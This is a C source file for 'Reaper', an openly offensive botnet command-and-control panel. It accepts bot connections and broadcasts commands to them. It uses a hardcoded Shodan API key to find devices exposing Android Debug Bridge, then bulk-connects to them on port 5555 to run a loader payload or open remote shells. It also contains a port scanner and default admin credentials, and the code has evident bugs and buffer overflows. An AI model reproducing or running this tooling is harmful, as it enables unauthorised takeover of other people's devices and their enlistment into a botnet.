#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <curl/curl.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define ADB_PAYLOAD "" // Edit this if you would like to use the built-in loader
#define BUFFER_SIZE 2000
#define SHODAN_KEY "PSKINdQe1GyxGgecYz2191H2JoS9qvgD" // You can change this if you want!

#define IP_ADDR "0.0.0.0" // Edit this!
#define PORT 1337 // Edit this!

#define PORT_START 1 
#define PORT_END 1024

unsigned int DEVICE_COUNT = 0;
pthread_mutex_t lock;

// You change this if you want!
const char ADMIN_ACCOUNT[64] = "admin";
const char ADMIN_PASSWORD[64] = "reaper";

#define saddr struct sockaddr


/*
Reaper
Date: 08/21/21
Author: 0x1CA3
*/


static void clear_screen(void) {
	printf("\033[H\033[2J");
}

static void ascii_banner(void) {
	clear_screen();
	puts("\e[0;32m          ..      ...                                                                  ");
    puts("\e[0;32m       :~'8888x :'%888x                                                                ");
    puts("\e[0;32m      8    8888Xf  8888>                          .d``                       .u    .   ");
    puts("\e[0;32m     X88x. ?8888k  8888X       .u          u      @8Ne.   .u        .u     .d88B :@8c  ");
    puts("\e[0;32m     '8888L'8888X  '%88X    ud8888.     us888u.   %%8888:u@88N    ud8888.  ='8888f8888r ");
    puts("\e[0;32m      '888X 8888X:xnHH(`` :888'8888. .@88 '8888'   `888I  888. :888'8888.   4888>'88'  ");
    puts("\e[0;32m        ?8~ 8888X X8888   d888 '88%%' 9888  9888     888I  888I d888 '88%%'   4888> '   ");
    puts("\e[0;32m      -~`   8888> X8888   8888.+'    9888  9888     888I  888I 8888.+'      4888>      ");
    puts("\e[0;32m      :H8x  8888  X8888   8888L      9888  9888   uW888L  888' 8888L       .d888L .+   ");
    puts("\e[0;32m      8888> 888~  X8888   '8888c. .+ 9888  9888  '*88888Nu88P  '8888c. .+  ^'8888*'    ");
    puts("\e[0;32m      48'` '8*~   `8888!`  '88888'   '888*''888'   '88888F'    '88888&&       ''      ");
    puts("\e[0;32m       ^-==''      `''       'YP'     ^Y'   'Y'    '888' ^        'YP'                 ");
    puts("\e[0;32m                                                    *8E                                ");
    puts("\e[0;32m          [ Made by https://github.com/0x1CA3 ]     '8>                                ");
    puts("\e[0;32m                                                                                       ");
}

static void help_menu(void) {
    puts("\n        ╔════ [Command] ════════════════════════════════════ [Description] ══════════════════════╗");
    puts("        ║     help                                           Displays help commands              ║");
    puts("        ║     bot                                            Displays bot commands               ║");
    puts("        ║     adb                                            Displays ADB commands               ║");
    puts("        ║     shodan                                         Displays shodan commands            ║");
    puts("        ║     misc                                           Displays extra commands             ║");
	puts("        ║     load                                           Starts a built-in loader for ADB    ║");
    puts("        ║     terminal                                       Lets you execute system commands    ║");
    puts("        ║     banner                                         Displays the banner                 ║");
    puts("        ║     clear                                          Clears the screen                   ║");
    puts("        ║     exit                                           Exits the botnet                    ║");
    puts("        ╚════════════════════════════════════════════════════════════════════════════════════════╝");
}

static void bot_menu(void) {
    puts("\n        ╔════ [Command] ════════════════════════════════════ [Description] ══════════════════════╗");
    puts("        ║     list                                           Displays the amount of bots         ║");
    puts("        ║     send_command                                   Lets you send a command to all bots ║");
    puts("        ╚════════════════════════════════════════════════════════════════════════════════════════╝");
}

static void adb_menu(void) {
    puts("\n        ╔════ [Command] ════════════════════════════════════ [Description] ══════════════════════╗");
    puts("        ║     connect                                        Connects to the specified device    ║");
    puts("        ║     cmd                                            Executes a command on that device   ║");
    puts("        ║     shell                                          Opens a shell on the device         ║");
	puts("        ║     restart                                        Restarts the ADB server             ║");
	puts("        ╚════════════════════════════════════════════════════════════════════════════════════════╝");
}

static void shodan_menu(void) {
    puts("\n        ╔════ [Command] ════════════════════════════════════ [Description] ══════════════════════╗");
    puts("        ║     search                                         Lets you lookup a specified device  ║");
    puts("        ║     devices                                        Scans for vulnerable devices        ║");
    puts("        ╚════════════════════════════════════════════════════════════════════════════════════════╝");
}

static void misc_menu(void) {
    puts("\n        ╔════ [Command] ════════════════════════════════════ [Description] ══════════════════════╗");
    puts("        ║     iplookup                                       Does an IP lookup on a specified IP ║");
    puts("        ║     portscan                                       Does a portscan on a specified IP   ║");
    puts("        ╚════════════════════════════════════════════════════════════════════════════════════════╝");
}

static void list_bots(void) {
	printf("\nBots -> %d\n", DEVICE_COUNT);
}

void terminal_cmd(void) {
	char *buffer;
	buffer = (char *)malloc(32 * sizeof(char));

	printf("\n\e[0;31m[!] To exit the terminal, use the 'quit' command! [!]");
	while (1) {
		printf("\n\e[0;31m╔═[ Reaper@Net ]═[ Terminal ]");
		printf("\n\e[0;31m╚═════════> ");
		
		scanf("%s", buffer);
		if (strcmp(buffer, "quit") == 0) {
			free(buffer);
			break;
		} else {
			system(buffer);
		}
	}
}

int ip_address_lookup(void) {
	char ip_api_track[255] = "http://ip-api.com/json/";
	
	char *user_input;
	user_input = (char *)malloc(32 * sizeof(char));

    printf("\n\e[0;31m╔═[ Reaper@Net ]═[ Enter IP ]");
	printf("\n\e[0;31m╚═════════> ");
    
    scanf("%s", user_input);
    strcat(ip_api_track, user_input);

    CURL *load = curl_easy_init();
    curl_easy_setopt(load, CURLOPT_CUSTOMREQUEST, "GET");
    curl_easy_setopt(load, CURLOPT_URL, ip_api_track);
    
    struct curl_slist *bheaders = NULL;
    bheaders = curl_slist_append(bheaders, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36");
    
	curl_easy_setopt(load, CURLOPT_HTTPHEADER, bheaders);
	CURLcode devices = curl_easy_perform(load);
	printf("\n\n");
	free(user_input);
}

int shodan_device_search(void) {
	char *device;
	device = (char *)malloc(32 * sizeof(char));
			
	printf("\n\e[0;31m╔═[ Reaper@Net ]═[ Enter Device IP ]");
	printf("\n\e[0;31m╚═════════> ");

	scanf("%s", device);
	
	char device_search_one[100] = "https://api.shodan.io/shodan/host/";
    char device_search_two[100] = "?key=";
    
    strcat(device_search_one, device);
    strcat(device_search_two , SHODAN_KEY);
    strcat(device_search_one, device_search_two);

    CURL *loadr = curl_easy_init();
    
    curl_easy_setopt(loadr, CURLOPT_CUSTOMREQUEST, "GET");
    curl_easy_setopt(loadr, CURLOPT_URL, device_search_one);
    
    struct curl_slist *bbheaders = NULL;
    bbheaders = curl_slist_append(bbheaders, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36");
    
	curl_easy_setopt(loadr, CURLOPT_HTTPHEADER, bbheaders);
	CURLcode devices = curl_easy_perform(loadr);
    
	printf("\n\n");
	free(device);
}

int scanner_shodan(void) {
    char vuln_url_one[255] = "https://api.shodan.io/shodan/host/count?key=";
    char vuln_url_two[255] = "&query=android+debug+bridge";
    
    strcat(vuln_url_one, SHODAN_KEY);
    strcat(vuln_url_one, vuln_url_two);

    CURL *load = curl_easy_init();
    curl_easy_setopt(load, CURLOPT_CUSTOMREQUEST, "GET");
    curl_easy_setopt(load, CURLOPT_URL, vuln_url_one);
    
    struct curl_slist *bheaders = NULL;
    bheaders = curl_slist_append(bheaders, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36");
    
	curl_easy_setopt(load, CURLOPT_HTTPHEADER, bheaders);
	CURLcode devices = curl_easy_perform(load);
	printf("\n\n");
}

void loader_scan(char line[5000]) {
	char line_loader_before[15] = "adb connect ";
	char line_loader_after[15] = ":5555";
	
	strcat(line, line_loader_after);
	strcat(line_loader_before, line);
	
	system("adb start-server");
	system(line_loader_before);
	
	system(ADB_PAYLOAD);
	system("adb kill-server");
}

void loader_adb(void) {
	FILE *loader_file;
	char line[5000];
	
	char *user_input;
	user_input = (char *)malloc(32 * sizeof(char));
	
	printf("\n\e[0;31m╔═[ Reaper@Net ]═[ Enter List (Example: List.txt) ]");
	printf("\n\e[0;31m╚═════════> ");
	
	scanf("%s", user_input);
	loader_file = fopen(user_input, "r");
	
	if (loader_file == NULL) {
		printf("[!] Error, file was not found! [!]");
	} else {
		while (fgets(line, sizeof(line), loader_file) != NULL) {
			loader_scan(line);
		}
	}
}

void scanner(void) {
	int fd, connection;
	
	char *ipscan;
	ipscan = (char *)malloc(32 * sizeof(char));

	printf("\n\e[0;31m╔═[ Reaper@Net ]═[ Enter IP ]");
	printf("\n\e[0;31m╚═════════> ");
	
	scanf("%s", ipscan);
	struct sockaddr_in s;

	s.sin_family = AF_INET;
	s.sin_addr.s_addr = inet_addr(ipscan);

	puts(""
	"\n[+] Open Ports [+]"
	"\n\n------------------");
	for (int i = PORT_START; i <= PORT_END; i++) {
		s.sin_port = htons(i);
		connection = connect(fd, (struct sockaddr *)&s, sizeof(s));
		if (connection < 0) {
			printf("");
		} else {
			printf("Port -> %d\n", i);
		}
	}
	free(ipscan);
}

void *handle_connection(void *connection) {
	cnc(*(int *)connection);
	pthread_exit(NULL);
	return NULL;
}

struct function {
    const char *shell;
    int (*function)(void);
};

struct function botnet_commands[] = {
    {"?", help_menu},
    {"help", help_menu},
    {"bot", bot_menu},
    {"adb", adb_menu},
    {"load", loader_adb},
    {"shodan", shodan_menu},
    {"misc", misc_menu},
	{"banner", ascii_banner},
	{"list", list_bots},
	{"devices", scanner_shodan},
	{"portscan", scanner},
	{"iplookup", ip_address_lookup},
	{"search", shodan_device_search},
	{"terminal", terminal_cmd},
	{"clear", clear_screen},
};

enum {commands_amount = sizeof(botnet_commands) / sizeof(botnet_commands[0])};

int handler(char shell[BUFFER_SIZE]) {
    for (int i = 0; i < commands_amount; i++) {
        if (strstr(shell, botnet_commands[i].shell)) {
            return (*botnet_commands[i].function)();
        }
    }
}

void cnc(int fd) {
	int k;
	int w_buf;
	char shell[BUFFER_SIZE];
	
	while (1) {
        pthread_mutex_lock(&lock);
        
		printf("\n\e[0;31m╔═[ Reaper@Net ]═[ Administrator ]");
		printf("\n\e[0;31m╚═════════> ");
		
		w_buf = 0;
		bzero(shell, BUFFER_SIZE);
		
		while ((shell[w_buf++] = getchar()) != '\n');
		
		if (strncmp("exit", shell, 4) == 0) {
			break;
		} else if (strncmp("send_command", shell, 12) == 0) {
			k = 0;
			
			char data_send[1024];
			bzero(data_send, 1024);

			printf("\n\e[0;31m╔═[ Reaper@Net ]═[ Enter Command ]");
			printf("\n\e[0;31m╚═════════> ");
			
			while ((data_send[k++] = getchar()) != '\n');
			
			for (int i = 0; i <= DEVICE_COUNT; i++) {
				pthread_mutex_unlock(&lock);
				if (write(fd, data_send, sizeof(data_send)) == -1) {
					DEVICE_COUNT--;
				}
				pthread_mutex_lock(&lock);
			}
			printf("\n[Data Successfully sent!]\n");
		} else if (strncmp("connect", shell, 7) == 0) {
			char adb_con_before[15] = "adb connect ";
			char adb_con_after[15] = ":5555";
			
			char *adb_connect_ip;
			adb_connect_ip = (char *)malloc(32 * sizeof(char));
			
			printf("\n\e[0;31m╔═[ Reaper@Net ]═[ Enter IP ]");
			printf("\n\e[0;31m╚═════════> ");
			scanf("%s", adb_connect_ip);
			
			strcat(adb_con_before, adb_connect_ip);
			strcat(adb_con_before, adb_con_after);
			
			system(adb_con_before);
			free(adb_connect_ip);
		} else if (strncmp("cmd", shell, 3) == 0) {
			char adb_shell_before[15] = "adb shell ";
			
			char *adb_cmd;
			adb_cmd = (char *)malloc(32 * sizeof(char));

			printf("\n\e[0;31m╔═[ Reaper@Net ]═[ Enter Command ]");
			printf("\n\e[0;31m╚═════════> ");
			
			scanf("%s", adb_cmd);
			strcat(adb_shell_before, adb_cmd);

			system(adb_shell_before);
			free(adb_cmd);
		} else if (strncmp("shell", shell, 5) == 0) {
			printf("\nRemember, to exit, just use the 'exit' command.");
			system("adb shell");
		} else if (strncmp("restart", shell, 7) == 0) {
			system("adb kill-server");
			system("adb start-server");
		} else {
			handler(shell);
		}
		pthread_mutex_unlock(&lock);
		sleep(1);
	}
	pthread_mutex_unlock(&lock);
}

int server(void) {
	int i = 0;
	
	int fd;
	int len;
	int connection;
	
	struct sockaddr_in sv, hh;
	bzero(&sv, sizeof(sv));

	sv.sin_family = AF_INET;
	sv.sin_addr.s_addr = inet_addr(IP_ADDR);
	sv.sin_port = htons(PORT);

	fd = socket(AF_INET, SOCK_STREAM, 0);

	bind(fd, (saddr *)&sv, sizeof(sv));
	listen(fd, 5);
	
	len = sizeof(hh);
    
	pthread_t thread[150];
    pthread_mutex_init(&lock, NULL);
	
	while(1) {
        connection = accept(fd, (saddr *)&hh, &len);
		DEVICE_COUNT++;
        pthread_create(&thread[i++], NULL, handle_connection, &connection);
    }
}

int main(void) {
	ascii_banner();
	
	char *username;
	char *password;

	username = (char *)malloc(32 * sizeof(char));
	password = (char *)malloc(32 * sizeof(char));

	printf("\n\e[0;31m[Username]#> ");
	scanf("%s", username);
	if (strcmp(username, ADMIN_ACCOUNT) == 0) {
		printf("\n\e[0;31m[Password]#> ");
		scanf("%s", password);
		if (strcmp(password, ADMIN_PASSWORD) == 0) {
			printf("\n[Authenticated Successfully!]\n");
			printf("\n[!] Before you can access the interface, you must have atleast one device connected. [!]\n");			
			free(username);
			free(password);
			server();
		} else {
			printf("\n[Incorrect username or password!]");
		}
	} else {
		printf("\n[Password]#> ");
		scanf("%s", username);
		printf("\n[Incorrect username or password!]");
	}
	free(username);
	free(password);
	EXIT_SUCCESS;
}